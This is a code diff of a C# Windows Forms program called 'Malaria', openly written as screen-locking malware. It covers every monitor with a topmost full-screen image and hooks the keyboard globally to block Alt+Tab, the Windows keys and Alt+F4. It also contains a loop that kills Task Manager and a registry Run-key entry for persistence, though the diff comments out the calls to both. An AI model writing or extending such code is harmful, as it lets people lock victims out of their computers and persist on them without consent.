@@ -1,92 +1,119 @@
+﻿using System;
 using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Threading;
+using System.Windows.Forms;
+using Gma.System.MouseKeyHook;
 using Malaria.Properties;
 using Microsoft.Win32;
 
-namespace Malaria;
-
-public partial class Form1 : Form
+namespace Malaria
 {
-    public Form1()
+    public partial class Malaria : Form
     {
-        DisplayImageOnAllScreens();
-        new Thread(KillTaskManager).Start();
-        new Thread(AutoStart).Start();
+        private IKeyboardMouseEvents _globalHook;
 
-        Hide();
-        Visible = false;
-        KeyPreview = true;
-    }
-    
-    private static void AutoStart()
-    {
-        var registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-        registryKey?.SetValue("Malaria", Application.ExecutablePath);
-    }
-
-    private static void DisplayImageOnAllScreens()
-    {
-        foreach (var screen in Screen.AllScreens)
+        public Malaria()
         {
-            var form = new Form
+            InitializeComponent();
+            DisplayImageOnAllScreens();
+            // new Thread(KillTaskManager).Start();
+            // new Thread(AutoStart).Start();
+            KeyPreview = true;
+            _globalHook = Hook.GlobalEvents();
+            _globalHook.KeyDown += GlobalHook_KeyDown;
+        }
+
+        private void GlobalHook_KeyDown(object sender, KeyEventArgs e)
+        {
+            // Block ALT + TAB
+            if (e.Alt && e.KeyCode == Keys.Tab)
             {
-                StartPosition = FormStartPosition.CenterScreen,
-                Location = screen.Bounds.Location,
-                Size = screen.Bounds.Size,
-                FormBorderStyle = FormBorderStyle.None,
-                WindowState = FormWindowState.Maximized,
-                TopMost = true,
-                BackgroundImageLayout = ImageLayout.Stretch
-            };
+                e.Handled = true; // Prevent the default action
+                return;
+            }
 
-            var imageResource = Resources.ResourceManager.GetObject("bg");
-            form.BackgroundImage = imageResource switch
+            // Block WIN + D
+            if (e.KeyCode == Keys.LWin || e.KeyCode == Keys.RWin)
             {
-                byte[] imageBytes => Image.FromStream(new MemoryStream(imageBytes)),
-                Image image => image,
-                _ => form.BackgroundImage
-            };
+                e.Handled = true; // Prevent the default action
+                return;
+            }
 
-            form.Show();
+            // Block ALT + F4
+            if (e.Alt && e.KeyCode == Keys.F4)
+            {
+                e.Handled = true; // Prevent the default action
+                return;
+            }
         }
-    }
 
-    private static void KillTaskManager()
-    {
-        while (true)
+        private static void AutoStart()
         {
-            var processes = Process.GetProcessesByName("taskmgr");
-            foreach (var process in processes) process.Kill();
+            var registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            registryKey?.SetValue("Malaria", Application.ExecutablePath);
         }
-    }
 
-    protected override void WndProc(ref Message m)
-    {
-        const int wmSysCommand = 0x0112;
-        const int scClose = 0xF060;
-        const int wmKeyDown = 0x0100;
-        const int wmKeyUp = 0x0101;
-
-        // ALT + F4
-        if (m.Msg == wmSysCommand && (int)m.WParam == scClose) return;
-
-        // Alt + Tab
-        if (m.Msg == wmKeyDown || m.Msg == wmKeyUp)
+        private static void DisplayImageOnAllScreens()
         {
-            var key = (Keys)m.WParam.ToInt32();
+            foreach (var screen in Screen.AllScreens)
+            {
+                var form = new Form
+                {
+                    StartPosition = FormStartPosition.CenterScreen,
+                    Location = screen.Bounds.Location,
+                    Size = screen.Bounds.Size,
+                    FormBorderStyle = FormBorderStyle.None,
+                    WindowState = FormWindowState.Maximized,
+                    TopMost = true,
+                    BackgroundImageLayout = ImageLayout.Stretch
+                };
 
-            // Alt+Tab is pressed
-            if ((ModifierKeys & Keys.Alt) != 0 && key == Keys.Tab) return;
+                var imageResource = Resources.ResourceManager.GetObject("bg");
 
-            // Alt+Esc is pressed
-            if ((ModifierKeys & Keys.Alt) != 0 && key == Keys.Escape) return;
+                if (imageResource is byte[] imageBytes)
+                {
+                    form.BackgroundImage = Image.FromStream(new MemoryStream(imageBytes));
+                }
+                else if (imageResource is Image image)
+                {
+                    form.BackgroundImage = image;
+                }
+
+                form.Show();
+            }
         }
-        
-        // Windows
-        if (m.Msg == wmSysCommand && (int)m.WParam == 0x0201) return;
-        
-        // Windows + Tab
-        if (m.Msg == wmSysCommand && (int)m.WParam == 0x0023) return;
 
-        base.WndProc(ref m);
+        private static void KillTaskManager()
+        {
+            while (true)
+            {
+                var processes = Process.GetProcessesByName("taskmgr");
+                foreach (var process in processes) process.Kill();
+            }
+        }
+
+        protected override void WndProc(ref Message m)
+        {
+            const int wmSysCommand = 0x0112;
+            const int scClose = 0xF060;
+
+            // Block ALT + F4
+            if (m.Msg == wmSysCommand && (int)m.WParam == scClose)
+            {
+                return; // Prevent the form from closing
+            }
+
+            base.WndProc(ref m); // Call the base method to ensure normal processing for other messages
+        }
+
+        protected override void OnFormClosing(FormClosingEventArgs e)
+        {
+            // Unhook the global hook when the form is closing
+            _globalHook.KeyDown -= GlobalHook_KeyDown;
+            _globalHook.Dispose();
+            base.OnFormClosing(e);
+        }
     }
 }
